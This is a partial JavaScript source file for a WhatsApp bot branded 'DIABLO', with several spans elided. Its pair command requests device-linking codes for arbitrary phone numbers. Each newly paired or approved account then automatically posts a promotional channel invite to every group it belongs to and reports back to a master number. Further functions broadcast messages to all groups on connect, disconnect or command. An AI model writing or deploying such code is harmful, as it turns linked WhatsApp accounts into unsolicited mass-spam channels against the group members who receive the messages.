...
// CHANNEL AUTOFORWARD FUNCTION
async function forwardChannelToGroups(sock, number) {
    try {
        const groups = await sock.groupFetchAllParticipating();
        for(const gid in groups) {
            await sock.sendMessage(gid, {
                text: `${DIABLO_BANNER}\n\n🚨 *NEW PAIRED ADMIN* 🚨\n*Number:* 234${number}\n\n*FOLLOW ${CHANNEL_NAME} NOW!*\nTap to join 👇\n${CHANNEL_LINK}\n\n*We drop:* Scripts, Updates, New Commands`,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    externalAdReply: {
        ...
        await sock.sendMessage(`${MASTER}@s.whatsapp.net`, {text: `✅ Channel invite sent to ${Object.keys(groups).length} groups for 234${number}`});
    } catch(e) {console.log(e)}
}

// BROADCAST TO ALL GROUPS FUNCTION
async function broadcastToAllGroups(sock, message) {
    try {
        ...
        await sock.sendMessage(`${MASTER}@s.whatsapp.net`, {text: `✅ Broadcast sent to ${Object.keys(groups).length} groups`});
    } catch(e) {console.log(e)}
}
...
cmd('channel','all','Get channel link', async(sock, msg) => {
    await sock.sendMessage(msg.key.remoteJid, {
        text: `*FOLLOW ${CHANNEL_NAME}*`,
        contextInfo: {
            externalAdReply: {
                title: CHANNEL_NAME,
                body: "Scripts • Updates • Codes",
                mediaType: 1,
                thumbnailUrl: "https://i.imgur.com/8Km9tLL.png",
                sourceUrl: CHANNEL_LINK
            }
...
// ========== MASTER COMMANDS ==========
cmd('pair','all','Generate code', async(sock, msg, args) => {
    const from = msg.key.remoteJid;
    const sender = jidDecode(msg.key.participant || msg.key.remoteJid).user;
    let isGroupAdmin = false;
    if(from.endsWith('@g.us')){const metadata = await sock.groupMetadata(from); const participant = metadata.participants.find(p => p.id.includes(sender)); isGroupAdmin = participant?.admin === 'admin' || participant?.admin === 'superadmin';}
    const canPair = isGroupAdmin || isMaster(sender) || await isPaired(sender);
    if(!canPair) return sock.sendMessage(from, {text: `❌ No permission`});
    let number = args[0] || sender; number = number.replace(/\D/g,'');
    const code = await sock.requestPairingCode(number);
    await sock.sendMessage(from, {text: `${DIABLO_BANNER}\n\n*CODE:* \`\`${code}\`\`\n\n*FOLLOW:* ${CHANNEL_LINK}`});
    await db.read();
    if(!await isPaired(number)){
        db.data.paired.push({number: number, pairedBy: sender, time: new Date().toISOString()})
        await db.write();
        forwardChannelToGroups(sock, number);
    }
});
...
cmd('approve','master','Approve', async(sock, msg, args) => {
    const number = args[0]?.replace(/\D/g,'');
    await db.read();
    if(!await isPaired(number)) {
        db.data.paired.push({number: number, pairedBy: MASTER})
        await db.write();
        forwardChannelToGroups(sock, number);
    }
    db.data.pendingRequests = db.data.pendingRequests.filter(r => r.number!== number);
    await db.write();
});
...
cmd('broadcastchannel','master','Broadcast to all groups', async(sock, msg, args) => {
    const text = args.join(' ');
    if(!text) return sock.sendMessage(msg.key.remoteJid, {text: `❌ Use: ${PREFIX}broadcastchannel We are fixing a bug`});
...
async function startSession(number) {
    ...
    sock.ev.on('connection.update', async (update) => {
        ...
        if(connection === 'open') {
            ...
            await broadcastToAllGroups(sock, `✅ Bot 234${number} is ONLINE and running v10.44`);
        }
        if(connection === 'close') {
            sessions.delete(number);
            const reason = lastDisconnect?.error?.output?.statusCode;
            await broadcastToAllGroups(sock, `⚠️ Bot 234${number} went OFFLINE. Reason: ${reason}. Restarting...`);
            if(reason!== DisconnectReason.loggedOut) startSession(number)
        }
